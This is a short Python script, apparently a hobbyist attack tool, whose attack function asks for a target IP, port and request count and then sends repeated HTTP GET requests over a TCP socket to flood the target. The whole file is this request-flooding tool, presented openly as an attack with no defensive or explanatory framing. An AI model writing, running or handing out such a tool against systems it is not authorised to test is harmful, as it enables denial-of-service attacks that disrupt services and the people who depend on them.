# Written by M. Terra Ellis
# Copyright SNAT: Nerd @ Technology
import socket
import time
 
def attack(target_ip, target_port, num_requests):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    # Connect to the target
    try:
        s.connect((target_ip, target_port))
    except Exception as e:
        print("Failed to connect:", e)
        return
 
    # Send requests
    for i in range(num_requests):
        try:
            s.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
            print("Request sent:", i+1)
            time.sleep(0.1)  # Adjust delay as needed
        except Exception as e:
            print("Failed to send request:", e)
            break
 
    # Close the connection
    s.close()
 
if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    num_requests = int(input("Enter the number of requests to send: "))
 
    attack(target_ip, target_port, num_requests)
